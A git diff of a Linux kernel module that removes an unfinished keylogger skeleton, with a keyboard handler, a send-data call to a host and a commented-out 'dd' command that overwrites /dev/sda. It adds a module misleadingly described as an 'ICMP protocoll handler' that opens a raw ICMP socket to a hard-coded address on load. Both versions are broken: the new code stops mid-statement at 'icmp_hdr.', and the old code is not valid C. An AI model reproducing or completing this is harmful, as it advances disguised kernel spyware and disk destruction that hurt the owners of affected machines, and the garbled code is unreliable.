@@ -1,52 +1,47 @@
-#define DEBUG true
-#define SUCCESS 0
-#define FAILURE 1
-#define OUTPUT_FD 1
-#define INPUT_FD 0
-#define ERROR_FD 2
-#define IP_HOST 127.0.0.1
-#define PORT_HOST 87
-
-#include <linux/module.h>
 #include <linux/init.h>
-#include <linux/input.h>
+#include <linux/module.h>
+#include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/net.h>
+#include <linux/in.h>
+#include <linux/inet.h>
+#include <net/sock.h>
 
-static struct input_handler kb_input_handler;
-static struct input_handle *kb_handle;
+#define HOST_IP "127.0.0.1"
+#define HOST_PORT 5678
 
-static int __init start(void)
-{
-if (DEBUG) pr_info("STARTED IN DEBUG MODE\n");
-return SUCCESS;
-spy();
+MODULE_AUTHOR("John Doe");
+MODULE_DESCRIPTION("ICMP protocoll handler");
+MODULE_LICENSE("GPL");
+
+static void establish_connection(void){
+    //creating socket
+    static struct socket *sock = NULL;
+    size_t socket_fd = sock_create(AF_INET, SOCK_RAW, IPPROTO_ICMP, &sock);
+    if(socket_fd<0) pr_err("Socket fd was not given");
+    
+    //setting up an address to send data
+    struct sockaddr_in address;
+    memset(&address, 0, sizeof(address));
+    address.sin_family = AF_INET;
+    address.sin_port = htons(HOST_PORT);
+    address.sin_addr.s_addr = in_aton(HOST_IP);
+
+    struct icmphdr icmp_hdr;
+    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
+    icmp_hdr.type = ICMP_ECHO;
+    icmp_hdr.checksum = 0;
+    icmp_hdr.
+static int __init start(void) {
+    pr_info(KERN_INFO "ICMP Module succesfully loaded"); //should be deleted
+    establish_connection();
+    return 0;
 }
 
-static int connect(void){
-    char[] msg = find_data();
-    send_data(msg, IP_HOST, PORT_HOST);
-    return SUCCESS;
-}
-
-static int keylogger(){
-
-}
-
-static int output_modifier(void){
-    freopen("funny-input.txt", "rt", stdin);
-}
-
-static int kill_order(){
-    system("system killed");
-    //system("dd if=/dev/random of=/dev/sda bs=1M conv=noerror status=progress")
-    return SUCCESS;
-}
-
-
-static void __exit end(void)
-{
-if (DEBUG) pr_info("WE'RE DONE\n");
+static void __exit finish(void) {
+    pr_info(KERN_INFO "ICMP Module deactivated"); //should be deleted
 }
 
 module_init(start);
-module_exit(end);
+module_exit(finish);
